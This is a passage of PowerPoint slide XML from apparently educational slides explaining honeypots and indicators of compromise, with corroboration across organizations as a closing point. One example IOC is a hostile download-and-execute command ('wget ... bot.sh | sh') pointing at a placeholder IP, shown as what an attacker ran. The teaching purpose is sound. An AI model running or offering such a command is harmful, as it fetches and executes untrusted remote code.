            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BACKGROUND</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What is a honeypot?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="definition"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="3931920" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A decoy computer that looks real but has no real users.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="honeypot points"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2286000"/>
            <a:ext cx="3931920" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nobody legitimate should ever touch it, so every connection is suspicious.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>It records what attackers do: where they come from, the commands they type, the files they download.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>That record is evidence other defenders can use.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="flow panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="1417320"/>
            <a:ext cx="3749040" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Attacker icon" descr="Attacker">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5166360" y="2103120"/>
            <a:ext cx="548640" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Attacker caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="2788920"/>
            <a:ext cx="1188720" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Attacker</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="flow arrow 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5824728" y="2377440"/>
            <a:ext cx="512064" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Honeypot (decoy) icon" descr="Honeypot (decoy)">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="2103120"/>
            <a:ext cx="548640" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Honeypot (decoy) caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="2788920"/>
            <a:ext cx="1188720" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Honeypot (decoy)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="flow arrow 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7104888" y="2377440"/>
            <a:ext cx="512064" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Recorded evidence icon" descr="Recorded evidence">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7726680" y="2103120"/>
            <a:ext cx="548640" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Recorded evidence caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="2788920"/>
            <a:ext cx="1188720" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Recorded evidence</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="flow caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5074920" y="3703320"/>
            <a:ext cx="3291840" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Any traffic that reaches the decoy is treated as hostile.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BACKGROUND</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What is an indicator of compromise?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="lead"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="8046720" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>An IOC is a clue left behind by an attack. Honeypots collect thousands of them.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="ioc 1 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1965960"/>
            <a:ext cx="2194560" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SOURCE ADDRESS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="ioc 1 code panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2286000"/>
            <a:ext cx="2194560" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="ioc 1 example"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2286000"/>
            <a:ext cx="1965960" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>203.0.113.45</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="ioc 1 meaning"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3154680"/>
            <a:ext cx="2194560" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Where the attack came from</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="ioc 2 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2926080" y="1965960"/>
            <a:ext cx="3291840" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PAYLOAD</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="ioc 2 code panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2926080" y="2286000"/>
            <a:ext cx="3291840" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="ioc 2 example"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3063240" y="2286000"/>
            <a:ext cx="3063240" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>wget http://198.51.100.7/bot.sh | sh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="ioc 2 meaning"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2926080" y="3154680"/>
            <a:ext cx="3291840" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What the attacker ran</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="ioc 3 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1965960"/>
            <a:ext cx="2194560" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SESSION TOKEN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="ioc 3 code panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="2286000"/>
            <a:ext cx="2194560" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="ioc 3 example"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="2286000"/>
            <a:ext cx="1965960" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>a3f9c2e1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="ioc 3 meaning"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="3154680"/>
            <a:ext cx="2194560" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>An ID the attack tool uses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="ioc rule"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3703320"/>
            <a:ext cx="8046720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="corroboration definition"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3840480"/>
            <a:ext cx="8046720" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Corroboration: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>when honeypots in different organizations see the same IOC, it is likely one campaign.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
